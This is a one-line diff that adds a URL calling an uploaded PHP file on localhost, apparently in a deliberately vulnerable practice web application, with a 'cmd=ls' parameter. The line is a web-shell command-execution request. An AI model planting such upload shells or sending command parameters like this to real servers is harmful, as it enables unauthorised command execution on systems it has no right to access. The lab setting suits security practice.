@@ -1,0 +1,1 @@
+http://localhost/hackable/uploads/upload.php?cmd=ls
